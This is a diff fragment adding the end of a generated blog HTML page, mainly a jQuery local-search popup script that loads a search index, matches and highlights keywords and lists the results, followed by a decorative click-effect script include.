+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/clicklove.js"></script>
+
+</body>
+</html>
